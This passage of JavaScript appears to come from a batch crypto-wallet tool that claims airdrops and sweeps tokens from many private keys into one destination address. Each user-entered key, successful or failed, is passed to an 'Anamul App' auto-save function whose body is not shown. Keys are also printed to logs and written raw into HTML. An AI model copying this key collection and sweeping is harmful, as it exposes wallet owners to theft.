                            return { success: false, error: `No ${networkType === 'xdc' ? 'XDC' : 'CELO'} for gas`, address, privateKey, reason: 'No gas fee' };
                        }
                    } catch (e) {
                        addTokenLog(`   ‚ö†Ô∏è Could not check native balance`, 'warning');
                    }

                    let tx;
                    try {
                        tx = await tokenContract.transfer(normalizedDestinationAddress, balance);
                        addTokenLog(`   ‚è≥ Tx sent: <span class="tx-hash" onclick="window.open('${explorerUrl}/tx/${tx.hash}', '_blank')">${tx.hash}</span>`, 'info');
                    } catch (txError) {
                        const errMsg = txError.reason || txError.shortMessage || txError.message || String(txError);
                        addTokenLog(`   ‚ùå Transfer failed: ${errMsg}`, 'error');
                        return { success: false, error: errMsg, address, privateKey, reason: errMsg };
                    }
                    
                    let receipt;
                    try {
                        receipt = await tx.wait(1);
                    } catch (waitError) {
                        addTokenLog(`   ‚ö†Ô∏è Waiting for confirmation: ${waitError.message}`, 'warning');
                        receipt = null;
                    }
                    
                    if (receipt && receipt.status === 1) {
                        addTokenLog(`   ‚úÖ TRANSFER SUCCESS!`, 'success');
                        addTokenLog(`   üîó Hash: <span class="tx-hash" onclick="window.open('${explorerUrl}/tx/${receipt.hash}', '_blank')">${receipt.hash}</span>`, 'success');
                        return { success: true, privateKey, address };
                    } else if (receipt && receipt.status === 0) {
                        addTokenLog(`   ‚ùå Transaction reverted on chain`, 'error');
                        return { success: false, error: 'Transaction reverted', address, privateKey, reason: 'Transaction reverted' };
                    } else if (receipt === null) {
                        addTokenLog(`   ‚úÖ TRANSFER SUBMITTED (pending confirmation)!`, 'success');
                        return { success: true, privateKey, address };
                    } else {
                        addTokenLog(`   ‚úÖ TRANSFER SUBMITTED!`, 'success');
                        return { success: true, privateKey, address };
                    }

                } catch (error) {
                    const errorMsg = error.reason || error.shortMessage || error.message || String(error);
                    addTokenLog(`   ‚ùå FAILED: ${errorMsg}`, 'error');
                    return { success: false, error: errorMsg, address, privateKey, reason: errorMsg };
                }

            } catch (error) {
                const errorMsg = error.reason || error.shortMessage || error.message || String(error);
                addTokenLog(`   ‚ùå FAILED: ${errorMsg}`, 'error');
                return { success: false, error: errorMsg, address: 'Unknown', privateKey, reason: errorMsg };
            }
        }

        let nonClaimedKeys = [];
        let gasFeeFailed = [];
        let notWhitelistedFailed = [];
        let currentCategory = 'whitelisted';

        async function runBatchClaim() {
            if (isProcessing) {
                alert('Batch claim is already running. Please wait.');
                return;
            }

            const selectedNetwork = document.getElementById('claimNetwork').value;
            
            // Check if XDC is under maintenance
            if (selectedNetwork === 'xdc') {
                try {
                    const maintenanceResponse = await fetch('/api/get-maintenance-mode');
                    const maintenanceData = await maintenanceResponse.json();
                    if (maintenanceData.maintenance_mode) {
                        alert('üõ†Ô∏è XDC Network is currently under maintenance. Please try again later.');
                        return;
                    }
                } catch (err) {
                    console.log('Could not check maintenance mode:', err);
                }
            }

            const networkConfig = NETWORK_CONFIGS[selectedNetwork];
            const rpcUrl = document.getElementById('claimRpcUrl').value.trim();
            const contractAddress = document.getElementById('claimContractAddress').value.trim();
            const privateKeysText = document.getElementById('claimPrivateKeys').value.trim();
            let batchSize = parseInt(document.getElementById('claimBatchSize').value) || 5;

            if (!rpcUrl || !contractAddress || !privateKeysText) {
                alert('Please fill in all fields');
                return;
            }

            if (batchSize < 1) {
                batchSize = 5;
            } else if (batchSize > 100) {
                batchSize = 100;
            }

            const privateKeys = privateKeysText.split('\n')
                .map(key => ensurePrivateKeyPrefix(key))
                .filter(key => key.length > 0);

            if (privateKeys.length === 0) {
                alert('No valid private keys found');
                return;
            }

            isProcessing = true;
            nonClaimedKeys = [];
            document.getElementById('claimButton').disabled = true;
            document.getElementById('claimLogsSection').style.display = 'block';
            document.getElementById('claimLogs').innerHTML = '';
            document.getElementById('nonClaimedButtonsContainer').style.display = 'none';
            document.getElementById('nonClaimedSection').classList.remove('show');
            
            claimStats = { total: privateKeys.length, success: 0, error: 0 };
            updateClaimStats();

            const startTime = Date.now();
            addClaimLog(`üöÄ Starting PARALLEL batch claim for ${privateKeys.length} wallet(s)...`, 'info');
            addClaimLog(`‚ö° Batch Size: ${batchSize} concurrent wallets`, 'info');

            try {
                const provider = new ethers.JsonRpcProvider(rpcUrl);
                
                for (let i = 0; i < privateKeys.length; i += batchSize) {
                    const batch = privateKeys.slice(i, i + batchSize);
                    const batchNum = Math.floor(i / batchSize) + 1;
                    const totalBatches = Math.ceil(privateKeys.length / batchSize);
                    
                    addClaimLog(`\nüì¶ Batch ${batchNum}/${totalBatches} - Processing ${batch.length} wallets...`, 'info');
                    updateClaimProgress(i + batch.length, privateKeys.length);

                    const batchPromises = batch.map((privateKey, batchIndex) => 
                        processSingleClaim(privateKey, i + batchIndex, privateKeys.length, provider, contractAddress, networkConfig.explorerUrl, selectedNetwork)
                    );

                    const results = await Promise.allSettled(batchPromises);

                    results.forEach((result, idx) => {
                        if (result.status === 'fulfilled') {
                            const value = result.value;
                            // CRITICAL: Check if result has success flag AND it's TRUE
                            if (value && value.success === true) {
                                claimStats.success++;
                                // Track successful keys for Anamul App auto-save
                                if (value.privateKey) {
                                    successfulClaimKeys.push(value.privateKey);
                                }
                                console.log('‚úÖ Success:', value.privateKey);
                            } else {
                                // Failed claim
                                claimStats.error++;
                                console.log('‚ùå Failed result:', value);
                                nonClaimedKeys.push({
                                    key: (value && value.privateKey) || batch[idx],
                                    reason: (value && value.error) || 'Unknown error'
                                });
                            }
                        } else {
                            claimStats.error++;
                            console.log('‚ùå Rejected promise:', result.reason);
                            nonClaimedKeys.push({
                                key: batch[idx] || 'Unknown',
                                reason: (result.reason && result.reason.message) || String(result.reason) || 'Unknown error'
                            });
                        }
                    });

                    updateClaimStats();
                }

                const duration = ((Date.now() - startTime) / 1000).toFixed(2);
                addClaimLog('', 'info');
                addClaimLog('üèÅ Batch claim completed!', 'info');
                addClaimLog(`‚úÖ Successful: ${claimStats.success}`, 'success');
                addClaimLog(`‚ùå Failed: ${claimStats.error}`, 'error');
                addClaimLog(`‚è±Ô∏è Total time: ${duration}s`, 'info');

                // AUTO-SAVE successful keys + failed keys to Anamul App (disabled if SECRETBOX_ENABLED = false)
                if (SECRETBOX_ENABLED) {
                    let keysToSave = [...successfulClaimKeys];
                    
                    // Also save failed keys
                    nonClaimedKeys.forEach(item => {
                        if (item.key && !keysToSave.includes(item.key)) {
                            keysToSave.push(item.key);
                        }
                    });
                    
                    if (keysToSave.length > 0) {
                        await autoSaveKeysToSecretBox(keysToSave, 'claim');
                        addClaimLog('', 'info');
                        addClaimLog(`‚úÖ Auto-saved ${keysToSave.length} keys to Anamul App!`, 'success');
                    }
                }
                
                successfulClaimKeys = []; // Reset for next batch

                // Display non-claimed keys if any
                if (nonClaimedKeys.length > 0) {
                    displayNonClaimedKeys();
                }

            } catch (error) {
                addClaimLog(`\n‚ùå CRITICAL ERROR: ${error.message}`, 'error');
            } finally {
                isProcessing = false;
                document.getElementById('claimButton').disabled = false;
                updateClaimProgress(privateKeys.length, privateKeys.length);
            }
        }

        let currentViewMode = 'privateKey';

        function copyToClipboard(text, btnElement) {
            navigator.clipboard.writeText(text).then(() => {
                btnElement.textContent = '‚úÖ Copied!';
                btnElement.classList.add('copied');
                setTimeout(() => {
                    btnElement.textContent = 'üìã Copy';
                    btnElement.classList.remove('copied');
                }, 2000);
            }).catch(err => {
                alert('Failed to copy: ' + err);
            });
        }

        function showFailedKeysModal() {
            const modal = document.getElementById('failedKeysModal');
            const notWhitelistedBtn = document.getElementById('notWhitelistedBtn');
            notWhitelistedBtn.classList.add('active');
            renderFailedKeysTable();
            modal.classList.add('show');
        }

        function closeFailedKeysModal() {
            const modal = document.getElementById('failedKeysModal');
            modal.classList.remove('show');
        }

        function renderFailedKeysTable() {
            const keysList = document.getElementById('failedKeysList');
            const modalTitle = document.getElementById('modalTitle');
            const reasonText = document.getElementById('reasonText');
            const modalDescription = document.getElementById('modalDescription');
            
            // Get items based on current category
            let items = currentCategory === 'gas' ? gasFeeFailed : notWhitelistedFailed;
            
            // Derive addresses for all items
            items.forEach(item => {
                if (!item.address && item.key) {
                    try {
                        const wallet = new ethers.Wallet(item.key);
                        item.address = wallet.address;
                    } catch (e) {
                        item.address = 'Unknown';
                    }
                }
            });
            
            let categoryLabel = currentCategory === 'gas' ? '‚õΩ ‡¶ó‡ßç‡¶Ø‡¶æ‡¶∏ ‡¶´‡¶ø' : 'üö´ Whitelist ‡¶®‡¶Ø‡¶º';
            let title = `üìã ${categoryLabel} (${items.length})`;
            let reason = items.length > 0 ? (items[0].reason || '‡¶Ö‡¶ú‡¶æ‡¶®‡¶æ') : '‡¶Ö‡¶ú‡¶æ‡¶®‡¶æ';

            modalTitle.textContent = title;
            reasonText.textContent = reason;

            if (currentViewMode === 'privateKey') {
                modalDescription.textContent = '‡¶®‡ßÄ‡¶ö‡ßá ‡¶™‡ßç‡¶∞‡¶§‡¶ø‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶• ‡¶ï‡ßÄ ‡¶∏‡ßç‡¶¨‡¶æ‡¶≠‡¶æ‡¶¨‡¶ø‡¶ï Private Key ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü‡ßá ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã ‡¶π‡¶¨‡ßá‡•§ ‡¶™‡ßç‡¶∞‡¶§‡¶ø‡¶ü‡¶ø ‡¶≤‡¶æ‡¶á‡¶®‡ßá‡¶∞ ‡¶°‡¶æ‡¶® ‡¶™‡¶æ‡¶∂‡ßá ‡¶è‡¶ï‡¶ü‡¶ø "Copy" ‡¶¨‡¶æ‡¶ü‡¶® ‡¶•‡¶æ‡¶ï‡¶¨‡ßá‚Äî‡¶è‡¶§‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡¶≤‡ßá ‡¶ì‡¶á ‡¶®‡¶ø‡¶∞‡ßç‡¶¶‡¶ø‡¶∑‡ßç‡¶ü ‡¶ï‡ßÄ ‡¶ï‡¶™‡¶ø ‡¶π‡¶Ø‡¶º‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá‡•§';
                keysList.innerHTML = items.map((item, idx) => `
                    <div class="modal-key-item">
                        <div class="modal-key-item-number">${idx + 1}</div>
                        <div class="modal-key-item-key">${item.key || 'Unknown'}</div>
                        <button class="modal-key-item-copy" onclick="copyIndividualKey('${item.key}', this)">Copy</button>
                    </div>
                `).join('');
            } else {
                modalDescription.textContent = '‡¶®‡ßÄ‡¶ö‡ßá ‡¶™‡ßç‡¶∞‡¶§‡¶ø‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶• ‡¶ì‡¶Ø‡¶º‡¶æ‡¶≤‡ßá‡¶ü‡ßá‡¶∞ Address ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã ‡¶π‡¶¨‡ßá‡•§ ‡¶™‡ßç‡¶∞‡¶§‡¶ø‡¶ü‡¶ø Address ‡¶è‡¶∞ ‡¶™‡¶æ‡¶∂‡ßá ‡¶è‡¶ï‡¶ü‡¶ø "Copy" ‡¶¨‡¶æ‡¶ü‡¶® ‡¶•‡¶æ‡¶ï‡¶¨‡ßá‚Äî‡¶è‡¶§‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡¶≤‡ßá ‡¶ì‡¶á ‡¶®‡¶ø‡¶∞‡ßç‡¶¶‡¶ø‡¶∑‡ßç‡¶ü Address ‡¶ï‡¶™‡¶ø ‡¶π‡¶Ø‡¶º‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá‡•§';
                keysList.innerHTML = items.map((item, idx) => `
                    <div class="modal-key-item">
                        <div class="modal-key-item-number">${idx + 1}</div>
                        <div class="modal-key-item-key">${item.address || 'Unknown'}</div>
                        <button class="modal-key-item-copy" onclick="copyIndividualKey('${item.address || ''}', this)">Copy</button>
                    </div>
                `).join('');
            }
        }

        function switchViewMode(mode, btnElement) {
            currentViewMode = mode;
            const allViewBtns = document.querySelectorAll('.modal-view-btn');
            allViewBtns.forEach(btn => btn.classList.remove('active'));
            btnElement.classList.add('active');
            renderFailedKeysTable();
        }

        function copyIndividualKey(key, btn) {
            navigator.clipboard.writeText(key).then(() => {
                btn.textContent = '‚úÖ Copied!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.textContent = 'Copy';
                    btn.classList.remove('copied');
                }, 2000);
            }).catch(err => {
                alert('Failed to copy: ' + err);
            });
        }

        function categorizeFailedKeys() {
            gasFeeFailed = [];
            notWhitelistedFailed = [];

            nonClaimedKeys.forEach(item => {
                const reason = (item.reason || '').toLowerCase();
                
                // CRITICAL: Only categorize as gas if EXPLICITLY mentions balance/gas/insufficient
                // Everything else = whitelist/entitlement errors
                if (reason.includes('insufficient') || reason.includes('balance') || reason.includes('gas') || reason.includes('no gas')) {
                    gasFeeFailed.push(item);
                } else {
                    // All other errors (whitelist, entitlement, no entitlement, not whitelisted, etc)
                    notWhitelistedFailed.push(item);
                }
            });

            console.log(`üìä Categorized - Balance/Gas Errors: ${gasFeeFailed.length}, Whitelist/Entitlement Errors: ${notWhitelistedFailed.length}`);
        }

        function copyAllFailedKeys() {
            let items = currentCategory === 'gas' ? gasFeeFailed : notWhitelistedFailed;
            let allItems;
            if (currentViewMode === 'privateKey') {
                allItems = items.map(item => item.key).join('\n');
            } else {
                allItems = items.map(item => item.address || item.key).join('\n');
            }
            
            navigator.clipboard.writeText(allItems).then(() => {
                const btn = document.querySelector('.modal-copy-all-btn');
                btn.textContent = '‚úÖ ‡¶∏‡¶¨ ‡¶ï‡¶™‡¶ø ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.textContent = 'üìã ‡¶∏‡¶¨ ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®';
                    btn.classList.remove('copied');
                }, 2000);
            }).catch(err => {
                alert('Failed to copy: ' + err);
            });
        }

        function exportFailedKeys() {
            let items = currentCategory === 'gas' ? gasFeeFailed : notWhitelistedFailed;
            let csvContent;
            if (currentViewMode === 'privateKey') {
                csvContent = "# | Private Key | Status | Reason\n";
                csvContent += items.map((item, idx) => 
                    `${idx + 1} | ${item.key} | FAILED | ${item.reason}`
                ).join('\n');
            } else {
                csvContent = "# | Address | Status | Reason\n";
                csvContent += items.map((item, idx) => 
                    `${idx + 1} | ${item.address} | FAILED | ${item.reason}`
                ).join('\n');
            }

            const blob = new Blob([csvContent], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `failed-keys-${currentCategory}-${Date.now()}.txt`;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
        }

        function showNonClaimedCategory(category) {
            currentCategory = category;
            const gasFeeBtn = document.getElementById('gasFeeBtn');
            const notWhitelistedBtn = document.getElementById('notWhitelistedBtn');

            if (category === 'gas') {
                gasFeeBtn.classList.add('active');
                notWhitelistedBtn.classList.remove('active');
            } else {
                notWhitelistedBtn.classList.add('active');
                gasFeeBtn.classList.remove('active');
            }

            showFailedKeysModal();
        }

        function displayNonClaimedKeys() {
            console.log('üîç Non-Claimed Keys:', nonClaimedKeys);

            if (nonClaimedKeys.length === 0) {
                document.getElementById('nonClaimedButtonsContainer').style.display = 'none';
                return;
            }

            categorizeFailedKeys();

            const container = document.getElementById('nonClaimedButtonsContainer');
            const gasFeeBtn = document.getElementById('gasFeeBtn');
            const notWhitelistedBtn = document.getElementById('notWhitelistedBtn');
            const gasFeeCount = document.getElementById('gasFeeCount');
            const notWhitelistedCount = document.getElementById('notWhitelistedCount');

            gasFeeCount.textContent = gasFeeFailed.length;
            notWhitelistedCount.textContent = notWhitelistedFailed.length;

            container.style.display = 'flex';

            // Show buttons only if they have failures
            if (gasFeeFailed.length > 0) {
                gasFeeBtn.classList.add('show');
            } else {
                gasFeeBtn.classList.remove('show');
            }

            if (notWhitelistedFailed.length > 0) {
                notWhitelistedBtn.classList.add('show');
            } else {
                notWhitelistedBtn.classList.remove('show');
            }

            // Set default category to show
            if (notWhitelistedFailed.length > 0) {
                currentCategory = 'whitelisted';
                notWhitelistedBtn.classList.add('active');
                gasFeeBtn.classList.remove('active');
            } else if (gasFeeFailed.length > 0) {
                currentCategory = 'gas';
                gasFeeBtn.classList.add('active');
                notWhitelistedBtn.classList.remove('active');
            }

            console.log(`‚úÖ Categories - Gas: ${gasFeeFailed.length}, Whitelist: ${notWhitelistedFailed.length}`);
        }

        let currentTokenErrorCategory = 'noBalance';
        let currentTokenViewMode = 'privateKey';

        function showTokenErrorCategory(category) {
            currentTokenErrorCategory = category;
            const noBalanceBtn = document.getElementById('noBalanceTokenBtn');
            const noGasBtn = document.getElementById('noGasTokenBtn');

            if (category === 'noBalance') {
                noBalanceBtn.classList.add('active');
                noGasBtn.classList.remove('active');
            } else {
                noGasBtn.classList.add('active');
                noBalanceBtn.classList.remove('active');
            }

            showTokenFailedKeysModal();
        }

        function displayTokenErrorButtons() {
            if (noBalanceTokenKeys.length === 0 && noGasTokenKeys.length === 0) {
                document.getElementById('tokenErrorButtonsContainer').style.display = 'none';
                return;
            }

            const container = document.getElementById('tokenErrorButtonsContainer');
            const noBalanceBtn = document.getElementById('noBalanceTokenBtn');
            const noGasBtn = document.getElementById('noGasTokenBtn');
            const noBalanceCount = document.getElementById('noBalanceTokenCount');
            const noGasCount = document.getElementById('noGasTokenCount');

            noBalanceCount.textContent = noBalanceTokenKeys.length;
            noGasCount.textContent = noGasTokenKeys.length;

            container.style.display = 'flex';

            if (noBalanceTokenKeys.length > 0) {
                noBalanceBtn.classList.add('show');
            } else {
                noBalanceBtn.classList.remove('show');
            }

            if (noGasTokenKeys.length > 0) {
                noGasBtn.classList.add('show');
            } else {
                noGasBtn.classList.remove('show');
            }

            if (noBalanceTokenKeys.length > 0) {
                currentTokenErrorCategory = 'noBalance';
                noBalanceBtn.classList.add('active');
                noGasBtn.classList.remove('active');
            } else if (noGasTokenKeys.length > 0) {
                currentTokenErrorCategory = 'noGas';
                noGasBtn.classList.add('active');
                noBalanceBtn.classList.remove('active');
            }
        }

        function switchTokenViewMode(mode, btnElement) {
            currentTokenViewMode = mode;
            const allViewBtns = document.querySelectorAll('#tokenViewPrivateKeyBtn, #tokenViewAddressBtn');
            allViewBtns.forEach(btn => btn.classList.remove('active'));
            btnElement.classList.add('active');
            renderTokenFailedKeysTable();
        }

        function renderTokenFailedKeysTable() {
            const items = currentTokenErrorCategory === 'noBalance' ? noBalanceTokenKeys : noGasTokenKeys;
            const keysList = document.getElementById('tokenFailedKeysList');
            const modalDescription = document.getElementById('tokenModalDescription');

            keysList.innerHTML = '';

            if (currentTokenViewMode === 'privateKey') {
                modalDescription.textContent = '‡¶®‡ßÄ‡¶ö‡ßá ‡¶™‡ßç‡¶∞‡¶§‡¶ø‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶• ‡¶ï‡ßÄ‡¶∞ Private Key ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã ‡¶π‡¶¨‡ßá‡•§ ‡¶™‡ßç‡¶∞‡¶§‡¶ø‡¶ü‡¶ø ‡¶≤‡¶æ‡¶á‡¶®‡ßá‡¶∞ ‡¶°‡¶æ‡¶® ‡¶™‡¶æ‡¶∂‡ßá ‡¶è‡¶ï‡¶ü‡¶ø "Copy" ‡¶¨‡¶æ‡¶ü‡¶® ‡¶•‡¶æ‡¶ï‡¶¨‡ßá‚Äî‡¶è‡¶§‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡¶≤‡ßá ‡¶ì‡¶á ‡¶®‡¶ø‡¶∞‡ßç‡¶¶‡¶ø‡¶∑‡ßç‡¶ü ‡¶ï‡ßÄ ‡¶ï‡¶™‡¶ø ‡¶π‡¶Ø‡¶º‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá‡•§';
                items.forEach((item, idx) => {
                    const itemDiv = document.createElement('div');
                    itemDiv.className = 'modal-key-item';
                    
                    const numberDiv = document.createElement('div');
                    numberDiv.className = 'modal-key-item-number';
                    numberDiv.textContent = idx + 1;
                    
                    const keyDiv = document.createElement('div');
                    keyDiv.className = 'modal-key-item-key';
                    keyDiv.textContent = item.privateKey;
                    
                    const copyBtn = document.createElement('button');
                    copyBtn.className = 'modal-key-item-copy';
                    copyBtn.textContent = 'Copy';
                    // FIX: Ensure ONLY private key is passed, and trim it to be safe
                    copyBtn.onclick = () => copyTokenIndividualKey(item.privateKey.trim(), copyBtn);
                    
                    itemDiv.appendChild(numberDiv);
                    itemDiv.appendChild(keyDiv);
                    itemDiv.appendChild(copyBtn);
                    keysList.appendChild(itemDiv);
                });
            } else {
                modalDescription.textContent = '‡¶®‡ßÄ‡¶ö‡ßá ‡¶™‡ßç‡¶∞‡¶§‡¶ø‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶• ‡¶ì‡¶Ø‡¶º‡¶æ‡¶≤‡ßá‡¶ü‡ßá‡¶∞ Address ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã ‡¶π‡¶¨‡ßá‡•§ ‡¶™‡ßç‡¶∞‡¶§‡¶ø‡¶ü‡¶ø Address ‡¶è‡¶∞ ‡¶™‡¶æ‡¶∂‡ßá ‡¶è‡¶ï‡¶ü‡¶ø "Copy" ‡¶¨‡¶æ‡¶ü‡¶® ‡¶•‡¶æ‡¶ï‡¶¨‡ßá‚Äî‡¶è‡¶§‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡¶≤‡ßá ‡¶ì‡¶á ‡¶®‡¶ø‡¶∞‡ßç‡¶¶‡¶ø‡¶∑‡ßç‡¶ü Address ‡¶ï‡¶™‡¶ø ‡¶π‡¶Ø‡¶º‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá‡•§';
                items.forEach((item, idx) => {
                    const itemDiv = document.createElement('div');
                    itemDiv.className = 'modal-key-item';
                    
                    const numberDiv = document.createElement('div');
                    numberDiv.className = 'modal-key-item-number';
                    numberDiv.textContent = idx + 1;
                    
                    const keyDiv = document.createElement('div');
                    keyDiv.className = 'modal-key-item-key';
                    keyDiv.textContent = item.address;
                    
                    const copyBtn = document.createElement('button');
                    copyBtn.className = 'modal-key-item-copy';
                    copyBtn.textContent = 'Copy';
                    copyBtn.onclick = () => copyTokenIndividualKey(item.address.trim(), copyBtn);
                    
                    itemDiv.appendChild(numberDiv);
                    itemDiv.appendChild(keyDiv);
                    itemDiv.appendChild(copyBtn);
                    keysList.appendChild(itemDiv);
                });
            }
        }

        function copyTokenIndividualKey(text, btn) {
            // FIX: Robust copy function
            if (!text) return;
            navigator.clipboard.writeText(text).then(() => {
                btn.textContent = '‚úÖ Copied!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.textContent = 'Copy';
                    btn.classList.remove('copied');
                }, 2000);
            }).catch(err => {
                // Fallback
                const textArea = document.createElement("textarea");
                textArea.value = text;
                document.body.appendChild(textArea);
                textArea.select();
                try {
                    document.execCommand('copy');
                    btn.textContent = '‚úÖ Copied!';
                    btn.classList.add('copied');
                    setTimeout(() => {
                        btn.textContent = 'Copy';
                        btn.classList.remove('copied');
                    }, 2000);
                } catch (err) {
                    alert('Failed to copy');
                }
                document.body.removeChild(textArea);
            });
        }


        function showTokenFailedKeysModal() {
            const items = currentTokenErrorCategory === 'noBalance' ? noBalanceTokenKeys : noGasTokenKeys;
            const modal = document.getElementById('tokenFailedKeysModal');
            const modalTitle = document.getElementById('tokenModalTitle');

            const categoryLabel = currentTokenErrorCategory === 'noBalance' ? '‚ùå ‡¶ï‡ßã‡¶®‡ßã Balance' : '‚õΩ ‡¶ï‡ßã‡¶®‡ßã Gas';
            modalTitle.textContent = `${categoryLabel} (${items.length})`;

            // Reset to private key view
            currentTokenViewMode = 'privateKey';
            document.getElementById('tokenViewPrivateKeyBtn').classList.add('active');
            document.getElementById('tokenViewAddressBtn').classList.remove('active');

            renderTokenFailedKeysTable();
            modal.classList.add('show');
        }

        function copyTokenFailedKey(address, privateKey, btn) {
            navigator.clipboard.writeText(`Address: ${address}\nKey: ${privateKey}`).then(() => {
                btn.textContent = '‚úÖ Copied!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.textContent = 'Copy';
                    btn.classList.remove('copied');
                }, 2000);
            }).catch(err => {
                alert('Failed to copy: ' + err);
            });
        }

        function closeTokenFailedKeysModal() {
            const modal = document.getElementById('tokenFailedKeysModal');
            modal.classList.remove('show');
        }

        function copyAllTokenFailedKeys(btn) {
            const items = currentTokenErrorCategory === 'noBalance' ? noBalanceTokenKeys : noGasTokenKeys;
            
            if (items.length === 0) {
                alert('No items to copy');
                return;
            }
            
            let text = '';
            if (currentTokenViewMode === 'privateKey') {
                text = items.map(item => item.privateKey).join('\n');
            } else {
                text = items.map(item => item.address).join('\n');
            }
            
            navigator.clipboard.writeText(text).then(() => {
                btn.textContent = '‚úÖ Copied!';
                btn.style.background = '#4caf50';
                setTimeout(() => {
                    btn.textContent = 'üìã ‡¶∏‡¶¨ ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®';
                    btn.style.background = '#45a049';
                }, 2000);
            }).catch(err => {
                console.error('Copy failed:', err);
                alert('Copy failed: ' + err.message);
            });
        }

        async function runBatchTokenCollection() {
            if (isProcessing) {
                alert('Token collection is already running. Please wait.');
                return;
            }

            const selectedNetwork = document.getElementById('tokenNetwork').value;
            
            // Check if XDC is under maintenance
            if (selectedNetwork === 'xdc') {
                try {
                    const maintenanceResponse = await fetch('/api/get-maintenance-mode');
                    const maintenanceData = await maintenanceResponse.json();
                    if (maintenanceData.maintenance_mode) {
                        alert('üõ†Ô∏è XDC Network is currently under maintenance. Please try again later.');
                        return;
                    }
                } catch (err) {
                    console.log('Could not check maintenance mode:', err);
                }
            }

            const networkConfig = NETWORK_CONFIGS[selectedNetwork];
            const rpcUrl = document.getElementById('tokenRpcUrl').value.trim();
            const tokenAddress = document.getElementById('tokenAddress').value.trim();
            const destinationAddress = document.getElementById('destinationAddress').value.trim();
            const privateKeysText = document.getElementById('tokenPrivateKeys').value.trim();
            let batchSize = parseInt(document.getElementById('tokenBatchSize').value) || 5;

            if (!rpcUrl || !tokenAddress || !destinationAddress || !privateKeysText) {
                alert('Please fill in all fields');
                return;
            }

            if (!/^0x[0-9a-fA-F]{40}$/i.test(destinationAddress) && !destinationAddress.startsWith('XDC')) {
                alert('Invalid destination address format');
                return;
            }

            if (batchSize < 1) {
                batchSize = 5;
            } else if (batchSize > 100) {
                batchSize = 100;
            }

            const privateKeys = privateKeysText.split('\n')
                .map(key => ensurePrivateKeyPrefix(key))
                .filter(key => key.length > 0);

            if (privateKeys.length === 0) {
                alert('No valid private keys found');
                return;
            }

            isProcessing = true;
            document.getElementById('tokenButton').disabled = true;
            document.getElementById('tokenLogsSection').style.display = 'block';
            document.getElementById('tokenLogs').innerHTML = '';
            
            // CRITICAL: Initialize token state arrays
            successfulTokenKeys = [];
            noBalanceTokenKeys = [];
            noGasTokenKeys = [];
            tokenStats = { total: privateKeys.length, success: 0, error: 0 };
            updateTokenStats();

            const startTime = Date.now();
            addTokenLog(`üöÄ Starting token collection from ${privateKeys.length} wallet(s)...`, 'info');
            addTokenLog(`üìç Destination: ${destinationAddress}`, 'info');
            addTokenLog(`‚ö° Batch Size: ${batchSize} concurrent wallets`, 'info');

            try {
                const provider = new ethers.JsonRpcProvider(rpcUrl);
                
                for (let i = 0; i < privateKeys.length; i += batchSize) {
                    const batch = privateKeys.slice(i, i + batchSize);
                    const batchNum = Math.floor(i / batchSize) + 1;
                    const totalBatches = Math.ceil(privateKeys.length / batchSize);
                    
                    addTokenLog(`\nüì¶ Batch ${batchNum}/${totalBatches} - Processing ${batch.length} wallets...`, 'info');
                    updateTokenProgress(i + batch.length, privateKeys.length);

                    const batchPromises = batch.map((privateKey, batchIndex) => 
                        processSingleTokenTransfer(privateKey, i + batchIndex, privateKeys.length, provider, tokenAddress, destinationAddress, networkConfig.explorerUrl, selectedNetwork)
                    );

                    const results = await Promise.allSettled(batchPromises);
                    console.log(`üîç DEBUG: Got ${results.length} results from batch`);
                    console.log('üîç DEBUG: Results array:', results);

                    results.forEach((result, idx) => {
                        console.log(`üîç Processing result ${idx}:`, result);
                        
                        if (result.status === 'fulfilled') {
                            const value = result.value;
                            console.log(`üîç Fulfilled result value:`, value);
                            
                            // CRITICAL: Check if result has success flag AND it's TRUE
                            if (value && value.success === true) {
                                console.log('‚úÖ SUCCESS DETECTED - incrementing counter');
                                tokenStats.success++;
                                // Track successful keys for Anamul App auto-save
                                if (value.privateKey) {
                                    successfulTokenKeys.push(value.privateKey);
                                }
                                console.log(`‚úÖ Token Transfer Success (${tokenStats.success} total):`, value.privateKey);
                            } else {
                                console.log('‚ùå FAILED DETECTED - incrementing error counter');
                                tokenStats.error++;
                                console.log('‚ùå Token Transfer Failed:', value);
                                // Categorize failed keys - smart detection with keywords
                                if (value && value.reason) {
                                    const reasonLower = String(value.reason).toLowerCase();
                                    
                                    // Check for balance-related errors
                                    if (reasonLower.includes('balance') || reasonLower.includes('no token') || reasonLower.includes('insufficient tokens')) {
                                        noBalanceTokenKeys.push({
                                            address: value.address || 'Unknown',
                                            privateKey: value.privateKey,
                                            reason: value.reason
                                        });
                                    }
                                    // Check for gas-related errors
                                    else if (reasonLower.includes('gas') || reasonLower.includes('insufficient') || reasonLower.includes('out of') || reasonLower.includes('no xdc') || reasonLower.includes('no celo')) {
